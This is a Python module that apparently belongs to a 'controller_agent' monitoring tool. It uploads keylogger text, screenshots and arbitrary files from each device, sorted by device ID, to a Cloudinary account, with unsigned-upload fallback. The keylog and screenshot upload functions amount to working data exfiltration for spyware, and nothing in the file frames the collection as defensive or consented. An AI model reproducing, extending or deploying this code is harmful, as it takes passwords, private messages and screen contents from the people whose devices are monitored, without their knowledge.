"""
Direct Cloudinary uploader for files and screenshots.
Simple upload pattern: Upload to Cloudinary → Get result → Send metadata to Django.
"""

import logging
import os
from dataclasses import dataclass
from typing import Optional

import cloudinary
import cloudinary.uploader
from dotenv import load_dotenv

load_dotenv()

logger = logging.getLogger(__name__)


# Folder structure in Cloudinary
FOLDER_SCREENSHOTS = "controller_agent/screenshots"
FOLDER_KEYLOGS = "controller_agent/keylogs"
FOLDER_FILES = "controller_agent/files"


@dataclass
class CloudinaryResult:
    """Result from a Cloudinary upload."""
    secure_url: str
    public_id: str
    url: str
    format: str
    bytes: int
    resource_type: str
    width: Optional[int] = None
    height: Optional[int] = None
    
    @classmethod
    def from_response(cls, response: dict) -> 'CloudinaryResult':
        """Create from Cloudinary API response."""
        return cls(
            secure_url=response.get('secure_url', ''),
            public_id=response.get('public_id', ''),
            url=response.get('url', ''),
            format=response.get('format', ''),
            bytes=response.get('bytes', 0),
            resource_type=response.get('resource_type', ''),
            width=response.get('width'),
            height=response.get('height'),
        )
    
    def to_dict(self) -> dict:
        """Convert to dictionary for API calls."""
        return {
            'secure_url': self.secure_url,
            'public_id': self.public_id,
            'url': self.url,
            'format': self.format,
            'size_bytes': self.bytes,
            'resource_type': self.resource_type,
            'width': self.width,
            'height': self.height,
        }


class CloudinaryClient:
    """
    Simple direct upload client for Cloudinary.
    Uses unsigned upload preset for easy integration.
    """
    
    def __init__(
        self, 
        cloud_name: str = None,
        api_key: str = None,
        api_secret: str = None,
        upload_preset: str = None
    ):
        self.cloud_name = cloud_name or os.getenv('CLOUDINARY_CLOUD_NAME')
        self.api_key = api_key or os.getenv('CLOUDINARY_API_KEY')
        self.api_secret = api_secret or os.getenv('CLOUDINARY_API_SECRET')
        # Default to 'ml_default' if not provided, common for unsigned uploads
        self.upload_preset = upload_preset or os.getenv('CLOUDINARY_UPLOAD_PRESET', 'ml_default')
        
        if not self.cloud_name:
            raise ValueError("CLOUDINARY_CLOUD_NAME is required")
        
        # Configure cloudinary
        # API Key and Secret are optional for unsigned uploads
        config_kwargs = {
            'cloud_name': self.cloud_name,
            'secure': True
        }
        if self.api_key and self.api_secret:
            config_kwargs['api_key'] = self.api_key
            config_kwargs['api_secret'] = self.api_secret
            
        cloudinary.config(**config_kwargs)
        
        auth_mode = "Signed (API Key)" if self.api_key else f"Unsigned (Preset: {self.upload_preset})"
        logger.info(f"Cloudinary configured for cloud: {self.cloud_name} [{auth_mode}]")
    
    def upload_screenshot(
        self, 
        file_path: str, 
        session_id: str,
        device_id: str = None
    ) -> Optional[CloudinaryResult]:
        """
        Upload screenshot image to Cloudinary.
        
        Args:
            file_path: Path to the screenshot image file
            session_id: Unique session/capture ID
            device_id: Optional device identifier for folder organization
        
        Returns:
            CloudinaryResult on success, None on failure
        """
        logger.info(f"📸 Starting screenshot upload: {session_id}")
        
        try:
            folder = FOLDER_SCREENSHOTS
            if device_id:
                folder = f"{FOLDER_SCREENSHOTS}/{device_id}"
            
            # Use signed upload if we have API key/secret, otherwise unsigned
            if self.api_key and self.api_secret:
                response = cloudinary.uploader.upload(
                    file_path,
                    folder=folder,
                    public_id=session_id,
                    resource_type="image",
                    overwrite=True,
                )
            else:
                # Unsigned upload with preset
                response = cloudinary.uploader.unsigned_upload(
                    file_path,
                    self.upload_preset,
                    folder=folder,
                    public_id=session_id,
                    resource_type="image",
                )
            
            result = CloudinaryResult.from_response(response)
            logger.info(f"✅ Screenshot uploaded: {result.secure_url}")
            return result
            
        except Exception as e:
            logger.error(f"❌ Screenshot upload failed: {e}")
            return None
    
    def upload_file(
        self, 
        file_path: str, 
        session_id: str,
        file_type: str = "raw",
        device_id: str = None
    ) -> Optional[CloudinaryResult]:
        """
        Upload a general file to Cloudinary.
        
        Args:
            file_path: Path to the file
            session_id: Unique session ID
            file_type: Resource type (image, raw, video, auto)
            device_id: Optional device identifier
        
        Returns:
            CloudinaryResult on success, None on failure
        """
        logger.info(f"📤 Starting file upload: {session_id}, type={file_type}")
        
        try:
            folder = FOLDER_FILES
            if device_id:
                folder = f"{FOLDER_FILES}/{device_id}"
            
            # Determine resource type based on extension if auto
            if file_type == "auto":
                ext = os.path.splitext(file_path)[1].lower()
                if ext in ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp']:
                    file_type = "image"
                elif ext in ['.mp4', '.avi', '.mov', '.webm']:
                    file_type = "video"
                else:
                    file_type = "raw"
            
            if self.api_key and self.api_secret:
                response = cloudinary.uploader.upload(
                    file_path,
                    folder=folder,
                    public_id=session_id,
                    resource_type=file_type,
                    overwrite=True,
                )
            else:
                response = cloudinary.uploader.unsigned_upload(
                    file_path,
                    self.upload_preset,
                    folder=folder,
                    public_id=session_id,
                    resource_type=file_type,
                )
            
            result = CloudinaryResult.from_response(response)
            logger.info(f"✅ File uploaded: {result.secure_url}")
            return result
            
        except Exception as e:
            logger.error(f"❌ File upload failed: {e}")
            return None
    
    def upload_keylog_text(
        self, 
        text_content: str, 
        session_id: str,
        device_id: str = None
    ) -> Optional[CloudinaryResult]:
        """
        Upload keylog text as a raw file to Cloudinary.
        
        Args:
            text_content: The keylog text content
            session_id: Unique session ID
            device_id: Optional device identifier
        
        Returns:
            CloudinaryResult on success, None on failure
        """
        logger.info(f"📤 Starting keylog upload: {session_id}")
        
        try:
            folder = FOLDER_KEYLOGS
            if device_id:
                folder = f"{FOLDER_KEYLOGS}/{device_id}"
            
            # Upload raw text content
            if self.api_key and self.api_secret:
                response = cloudinary.uploader.upload(
                    text_content.encode('utf-8'),
                    folder=folder,
                    public_id=session_id,
                    resource_type="raw",
                    overwrite=True,
                )
            else:
                response = cloudinary.uploader.unsigned_upload(
                    text_content.encode('utf-8'),
                    self.upload_preset,
                    folder=folder,
                    public_id=session_id,
                    resource_type="raw",
                )
            
            result = CloudinaryResult.from_response(response)
            logger.info(f"✅ Keylog uploaded: {result.secure_url}")
            return result
            
        except Exception as e:
            logger.error(f"❌ Keylog upload failed: {e}")
            return None


# Singleton instance
_cloudinary_client: Optional[CloudinaryClient] = None


def get_cloudinary_client() -> Optional[CloudinaryClient]:
    """Get the Cloudinary client instance."""
    return _cloudinary_client


def init_cloudinary_client(**kwargs) -> CloudinaryClient:
    """Initialize the Cloudinary client singleton."""
    global _cloudinary_client
    _cloudinary_client = CloudinaryClient(**kwargs)
    return _cloudinary_client
